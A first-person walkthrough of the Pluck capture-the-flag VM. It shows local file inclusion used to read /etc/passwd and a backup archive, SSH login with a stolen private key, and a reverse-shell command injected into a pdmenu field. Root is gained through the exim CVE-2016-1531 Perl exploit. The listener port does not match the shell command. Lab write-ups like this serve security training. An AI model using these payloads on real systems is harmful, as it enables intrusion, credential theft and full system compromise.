Hi Guys,

Here is my walkthrough for [Pluck VM](https://www.vulnhub.com/entry/pluck-1,178/).

Setup:
```bash
attacker: 192.168.56.1
victim  : 192.168.56.102
```

I started with a nmap scan:
```bash
# Nmap 7.40SVN scan initiated Sat Mar 11 16:57:24 2017 as: nmap -Pn -n -T4 -p- -v6 192.168.56.102
Nmap scan report for 192.168.56.102
Host is up, received arp-response (0.0013s latency).
Scanned at 2017-03-11 16:57:24 GMT for 3s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
5355/tcp open  llmnr   syn-ack ttl 1
MAC Address: 08:00:27:45:29:54 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/local/bin/../share/nmap
# Nmap done at Sat Mar 11 16:57:27 2017 -- 1 IP address (1 host up) scanned in 2.95 seconds
```

There are 4 interesting services, but lets start with the most obvious one, 80(HTTP).

Connecting to it gave a nice interface, with a menu:
- Home
- About
- Contact Us
- Admin

Clicking on all these menus I discovered the following:
- Home and About are LFI links
- Admin 'suffers' from SQLi

I putted suffers in between quotes as, it does give an SQLi error when you add a tick in the email field, but could not continue from there.
So I continued with the LFI. First lets get the password file:

```bash
➜  pluck curl "http://192.168.56.102/index.php?page=/etc/passwd"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Pluck</title>
<link rel="stylesheet" href="/css/bootstrap.min.css">
<link rel="stylesheet" href="/css/bootstrap-theme.min.css">
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</head>
<body>
<nav id="myNavbar" class="navbar navbar-default navbar-inverse navbar-fixed-top" role="navigation">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbarCollapse">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">Pluck</a>
        </div>
        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="nav navbar-nav">
                <li><a href="/">Home</a></li>
                <li><a href="index.php?page=about.php">About</a></li>
                <li><a href="index.php?page=contact.php">Contact Us</a></li>
                <li><a href="admin.php">Admin</a></li>
            </ul>
        </div>
    </div>
</nav>
<div class="container">
<br><br><br><br>
 	<div class=jumbotron>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:108:65534::/var/lib/lxd/:/bin/false
uuidd:x:109:114::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:112:1::/var/cache/pollinate:/bin/false
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
Debian-exim:x:113:119::/var/spool/exim4:/bin/false
peter:x:1001:1001:,,,:/home/peter:/bin/bash
paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
</div><br>    <hr>
    <div class="row">
        <div class="col-sm-12">
            <footer>
                <p>© Copyright 2017 Pluck</p>
            </footer>
        </div>
    </div>
</div>
</body>
</html>          
```

Perfect, and look the backup-user doesn't have a shell, but a script. Lets look at that script:

```bash
➜  pluck curl "http://192.168.56.102/index.php?page=/usr/local/scripts/backup.sh"
<!-- SNIP -->
#!/bin/bash

########################
# Server Backup script #
########################

#Backup directories in /backups so we can get it via tftp

echo "Backing up data"
tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null
echo "Backup complete"
<!-- SNIP -->                                
```

Ah, nice it creates a tar-file in the backups directory from the home and web-pages. If we're lucky we can get that file too.

```bash
wget "http://192.168.56.102/index.php?page=/backups/backup.tar"           
--2017-03-12 18:35:38--  http://192.168.56.102/index.php?page=/backups/backup.tar
Connecting to 192.168.56.102:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.php?page=%2Fbackups%2Fbackup.tar’

index.php?page=%2Fbackups%2Fbackup.tar                  [                                                                                <=>                               ]   6.23G  32.4MB/s    in 79s     

2017-03-12 18:36:57 (80.5 MB/s) - Read error at byte 6685945954 (Success).Retrying.

--2017-03-12 18:36:58--  (try: 2)  http://192.168.56.102/index.php?page=/backups/backup.tar
Connecting to 192.168.56.102:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.php?page=%2Fbackups%2Fbackup.tar’

index.php?page=%2Fbackups%2Fbackup.tar                  [                                                         <=>                                                      ]   6.23G   493MB/s    in 12s     

2017-03-12 18:37:10 (525 MB/s) - Read error at byte 6685945954 (Success).Retrying.

--2017-03-12 18:37:12--  (try: 3)  http://192.168.56.102/index.php?page=/backups/backup.tar
Connecting to 192.168.56.102:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.php?page=%2Fbackups%2Fbackup.tar’

index.php?page=%2Fbackups%2Fbackup.tar                  [                                                     <=>                                                          ]   6.23G   536MB/s    in 11s     

2017-03-12 18:37:23 (587 MB/s) - Read error at byte 6685945954 (Success).Retrying.

--2017-03-12 18:37:26--  (try: 4)  http://192.168.56.102/index.php?page=/backups/backup.tar
Connecting to 192.168.56.102:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.php?page=%2Fbackups%2Fbackup.tar’
```

As it appears, the file is downloaded every time for 6685945954 and then breaks. Fortunately tar is a streaming archive in which the files are concatenated, so we might get some files out of it anyway.

```bash
➜  pluck tar xf backup.tar 
tar: This does not look like a tar archive
tar: Skipping to next header
tar: Skipping to next header
tar: Skipping to next header
tar: Skipping to next header
<-- SNIP -->
tar: Skipping to next header
tar: Skipping to next header
tar: Skipping to next header
tar: Skipping to next header
tar: Skipping to next header
tar: Exiting with failure status due to previous errors
```

This was to be expected, therer are errors but lets see what we have anyway

```bash
➜  pluck find .
.
./var
./var/www
./var/www/html
./var/www/html/about.php
./var/www/html/fonts
./var/www/html/fonts/glyphicons-halflings-regular.svg
./var/www/html/fonts/glyphicons-halflings-regular.woff2
./var/www/html/fonts/glyphicons-halflings-regular.ttf
./var/www/html/fonts/glyphicons-halflings-regular.woff
./var/www/html/fonts/glyphicons-halflings-regular.eot
./var/www/html/index.php
./backup.tar
./ome
./ome/bob
./ome/bob/.sudo_as_admin_successful
./home
./home/peter
./home/peter/.profile
./home/peter/.bashrc
./home/peter/.bash_logout
./home/paul
./home/paul/keys
./home/paul/keys/id_key2
./home/paul/keys/id_key5
./home/paul/keys/id_key3.pub
./home/paul/keys/id_key5.pub
./home/paul/keys/id_key1.pub
./home/paul/keys/id_key6
./home/paul/keys/id_key4.pub
./home/paul/keys/id_key2.pub
./home/paul/keys/id_key4
./home/paul/keys/id_key1
./home/paul/keys/id_key6.pub
./home/paul/keys/id_key3
./home/paul/.profile
./home/paul/.bashrc
./home/paul/.bash_logout
./home/bob
./home/bob/.profile
./home/bob/.bashrc
./home/bob/.sudo_as_admin_successful
./home/bob/.bash_logout
```

Cool, it did work. We are missing some files (admin.php, contact.php) but that's ok. The interesting bit are the keys that paul has. Perhaps these are used as ssh keys, lets test that. The first three keys ask for a password, however the forth key gives an error.

```bash
➜  keys ssh -i id_key4 paul@192.168.56.102
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0775 for 'id_key4' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_key4": bad permissions
paul@192.168.56.102's password: 
```

This tells me that the key is being used, however it has got the wrong permissions. So, first I set the permissions to 400 and tried again. 
Success, I get a Pdmenu 1.3.4 interface.

```
┌─────Main Menu─────┐
│ Directory listing │
│ Change directory  │
│ Edit file         │
│ Who's online?     │
│ WWW               │
│ Telnet            │
│ Ping              │
│                   │
│ Exit              │
└───────────────────┘
```

Time to start testing the various options. Directory listing gives the listing of my current directory. Change directory just does that. 
Edit file launches VIM. Cool, lets try a shell from there. 

Funnily enough you get back to pdmenu when you run :! in vim.  Nice, but not handy.

Who's online, launches who (I'm alone .... duh). WWW launches lynx, and Telnet and Ping speak for them selves. So, which of these three suffer from command injection. 

After reading up on Pdmenu I found that there is a .pdmenurc file that structures the menu. Lets see if we can edit that. 
We can and see the where vulnerability lies.

```bash
#!/usr/bin/pdmenu
#
# Note that the above bang-path isn't required, but it lets you run this
# file directly as a sort of pdmenu script.

# Sample menus for Pdmenu.

# Define the main menu.
menu:main:Main Menu
        exec:_Directory listing:truncate:ls -l
        exec:_Change directory:edit,set:echo PWD=~set to?:~
        exec:_Edit file:edit,pause:vim ~filename?:~
        exec:_Who's online?:truncate:echo "These users are online:";w
        exec:_WWW:edit,pause:lynx ~URL?:~
        exec:_Telnet:edit,pause:telnet "~Telnet to where?:~"
        exec:_Ping:edit,pause:ping "~host?:~"
        nop
        exit:_Exit
~                       
```

It's clear that the input for both Telnet and Ping are enclosed, this is not the case with WWW. We should be able to perform command injection here.

Lets first see if netcat is installed. It is, but it's the openbsd version. So we're going to open the following location:

localhost ; rm /tmp/pluck;mkfifo /tmp/pluck;cat /tmp/pluck|/bin/sh -i 2>&1 |nc 192.168.56.1 4444 >/tmp/pluck   

```bash
➜  keys nc -vnlp 5555
Listening on [0.0.0.0] (family 0, port 5555)
Connection from [192.168.56.102] port 5555 [tcp/*] accepted (family 2, sport 57726)
$ whoami
paul
$ 
```

Woot, we got shell. Now the 'only' thing we need to do is to get root. But first some local recon. Weirdly enough there are no suspicious files
present (except an image called rubber-duck .... don't ask). I did notice the following, there is an exim user. 

Is it possible that this has anything to do with the [PoC of CVE-2016-1531](https://www.exploit-db.com/exploits/39535/). Lets try it out

```bash
$ cat > /tmp/root.pm << EOF                 
package root;
use strict;
use warnings;
 
system("/bin/sh");
EOF> > > > > > 
$  PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = "en_ZA:en",
	LC_ALL = (unset),
	LC_CTYPE = "en_GB.UTF-8",
	LANG = "en_ZA.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to a fallback locale ("en_ZA.UTF-8").
id
uid=0(root) gid=1002(paul) groups=1002(paul)
cd /root
ls
flag.txt
cat flag.txt

Congratulations you found the flag

---------------------------------------

######   ((((((((((((((((((((((((((((((
#########   (((((((((((((((((((((((((((
,,##########   ((((((((((((((((((((((((
@@,,,##########   (((((((((((((((((((((
@@@@@,,,##########                     
@@@@@@@@,,,############################
@@@@@@@@@@@,,,#########################
@@@@@@@@@,,,###########################
@@@@@@,,,##########                    
@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&


```


WOOT, done.

Thanks to @ryanoberto for the nice VM and [Vulnhub](https://www.vulnhub.com/) for hosting it. 
